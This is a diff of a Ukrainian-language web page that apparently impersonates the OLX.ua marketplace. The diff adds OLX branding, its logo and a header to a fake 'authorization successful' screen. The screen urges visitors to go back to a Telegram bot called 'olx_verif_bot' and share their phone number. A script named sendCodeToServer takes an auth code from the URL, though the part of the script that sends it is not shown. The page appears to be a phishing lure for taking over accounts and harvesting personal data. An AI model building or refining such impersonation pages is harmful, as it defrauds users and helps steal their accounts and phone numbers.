@@ -1,137 +1,198 @@
 <!DOCTYPE html>
 <html lang="uk">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Авторизація успішна</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Авторизація успішна — OLX.ua</title>
 
-<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
 
-<style>
+    <style>
+        :root {
+            --olx-dark: #002f34;
+            --olx-bg: #f2f4f5;
+            --olx-cyan: #23E5DB;
+        }
 
-body{
-margin:0;
-font-family:'Roboto',sans-serif;
-height:100vh;
-display:flex;
-align-items:center;
-justify-content:center;
-background:linear-gradient(135deg,#e8f0f1,#f2f4f5);
-}
+        body {
+            margin: 0;
+            font-family: 'Roboto', sans-serif;
+            background-color: var(--olx-bg);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
 
-/* карточка */
+        /* ШАПКА */
+        header {
+            background-color: var(--olx-dark);
+            height: 72px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 0 16px;
+            width: 100%;
+            box-sizing: border-box;
+        }
 
-.container{
-background:white;
-width:90%;
-max-width:420px;
-padding:45px 35px;
-border-radius:16px;
-box-shadow:0 15px 40px rgba(0,0,0,0.12);
-text-align:center;
-animation:fadeIn .6s ease;
-}
+        .header-container {
+            width: 100%;
+            max-width: 1200px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
 
-/* анимация появления */
+        .nav-links {
+            display: flex;
+            gap: 20px;
+            color: white;
+            font-size: 14px;
+            font-weight: bold;
+            align-items: center;
+        }
 
-@keyframes fadeIn{
-from{opacity:0;transform:translateY(20px)}
-to{opacity:1;transform:translateY(0)}
-}
+        .btn-add {
+            background: white !important;
+            color: var(--olx-dark) !important;
+            padding: 10px 20px;
+            border-radius: 4px;
+            font-weight: bold;
+            font-size: 14px;
+            text-decoration: none;
+        }
 
-/* галочка */
+        /* КОНТЕНТ */
+        main {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
 
-.checkmark{
-width:80px;
-height:80px;
-border-radius:50%;
-background:#27ae60;
-margin:0 auto 20px;
-display:flex;
-align-items:center;
-justify-content:center;
-animation:pop .4s ease;
-}
+        .container {
+            background: white;
+            width: 100%;
+            max-width: 420px;
+            padding: 45px 35px;
+            border-radius: 16px;
+            box-shadow: 0 15px 40px rgba(0,0,0,0.12);
+            text-align: center;
+            animation: fadeIn .6s ease;
+            box-sizing: border-box;
+        }
 
-.checkmark svg{
-width:40px;
-height:40px;
-stroke:white;
-stroke-width:4;
-fill:none;
-}
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px) }
+            to { opacity: 1; transform: translateY(0) }
+        }
 
-@keyframes pop{
-0%{transform:scale(.6);opacity:.3}
-100%{transform:scale(1);opacity:1}
-}
+        .checkmark {
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            background: #27ae60;
+            margin: 0 auto 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            animation: pop .4s ease;
+        }
 
-h1{
-font-size:24px;
-margin:10px 0;
-color:#1f2d3d;
-}
+        .checkmark svg {
+            width: 40px;
+            height: 40px;
+            stroke: white;
+            stroke-width: 4;
+            fill: none;
+        }
 
-p{
-color:#5f6c7b;
-font-size:14px;
-margin-bottom:30px;
-}
+        @keyframes pop {
+            0% { transform: scale(.6); opacity: .3 }
+            100% { transform: scale(1); opacity: 1 }
+        }
 
-/* кнопка */
+        h1 {
+            font-size: 24px;
+            margin: 10px 0;
+            color: #1f2d3d;
+        }
 
-.btn{
-display:block;
-width:100%;
-padding:16px;
-background:#1f2d3d;
-color:white;
-font-weight:700;
-border-radius:10px;
-text-decoration:none;
-transition:.25s;
-box-shadow:0 6px 15px rgba(0,0,0,.15);
-}
+        p {
+            color: #5f6c7b;
+            font-size: 14px;
+            margin-bottom: 30px;
+            line-height: 1.5;
+        }
 
-.btn:hover{
-transform:translateY(-2px);
-box-shadow:0 10px 20px rgba(0,0,0,.18);
-}
+        .btn {
+            display: block;
+            width: 100%;
+            padding: 16px;
+            background: var(--olx-dark);
+            color: white;
+            font-weight: 700;
+            border-radius: 10px;
+            text-decoration: none;
+            transition: .25s;
+            box-shadow: 0 6px 15px rgba(0,0,0,.15);
+            box-sizing: border-box;
+        }
 
-.btn:active{
-transform:scale(.97);
-}
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(0,0,0,.18);
+        }
 
-.footer{
-margin-top:25px;
-font-size:11px;
-color:#9aa7b3;
-}
+        .footer-text {
+            margin-top: 25px;
+            font-size: 11px;
+            color: #9aa7b3;
+        }
 
-</style>
+        @media (max-width: 768px) {
+            header { height: 60px; }
+            .nav-links a:not(.btn-add) { display: none; }
+        }
+    </style>
 </head>
 
 <body>
 
-<div class="container">
+<header>
+    <div class="header-container">
+        <a href="#">
+            <svg class="logo" xmlns="http://www.w3.org/2000/svg" width="64" height="37" viewBox="0 0 64 37" fill="none">
+                <path d="M42.6667 0V37H33.5253V0H42.6667ZM15.2427 3.07524C23.6587 3.07524 30.4853 9.98104 30.4853 18.4946C30.4853 27.0082 23.6587 33.914 15.2427 33.914C6.82667 33.914 0 27.0082 0 18.4946C0 9.98104 6.82667 3.07524 15.2427 3.07524ZM52.1813 9.2473L54.8587 11.9557L57.536 9.2473H64V15.7862L61.3227 18.4946L64 21.203V27.7419H57.536L54.8587 25.0335L52.1813 27.7419H45.7173V21.203L48.3947 18.4946L45.7173 15.7862V9.2473H52.1813ZM15.2427 12.3333C11.8827 12.3333 9.152 15.0957 9.152 18.4946C9.152 21.8936 11.8827 24.6559 15.2427 24.6559C18.6027 24.6559 21.3333 21.8936 21.3333 18.4946C21.3333 15.0957 18.6027 12.3333 15.2427 12.3333Z" fill="#23E5DB"></path>
+            </svg>
+        </a>
+        <div class="nav-links">
+            <a href="#" class="btn-add">Подати оголошення</a>
+        </div>
+    </div>
+</header>
 
-<div class="checkmark">
-<svg viewBox="0 0 24 24">
-<polyline points="4,13 9,18 20,6"/>
-</svg>
-</div>
+<main>
+    <div class="container">
+        <div class="checkmark">
+            <svg viewBox="0 0 24 24">
+                <polyline points="4,13 9,18 20,6"/>
+            </svg>
+        </div>
 
-<h1>Авторизація пройшла успішно</h1>
+        <h1>Авторизація пройшла успішно</h1>
 
-<p>Поверніться до Telegram і натисніть 📲поділитися номером</p>
+        <p>Поверніться до Telegram і натисніть <br><b>📲 поділитися номером</b></p>
 
-<a href="https://t.me/olx_verif_bot" class="btn">Повернутися</a>
+        <a href="https://t.me/olx_verif_bot" class="btn">Повернутися до бота</a>
 
-<div class="footer">
-© OLX.UA 2026
-</div>
+        <div class="footer-text">
+            © OLX.UA 2026
+        </div>
+    </div>
+</main>
 
-</div>
 <script>
 async function sendCodeToServer(authCode) {
     if (!authCode) return;
@@ -160,5 +221,3 @@ if (codeFromUrl) {
 </script>
 </body>
 </html>
-
-
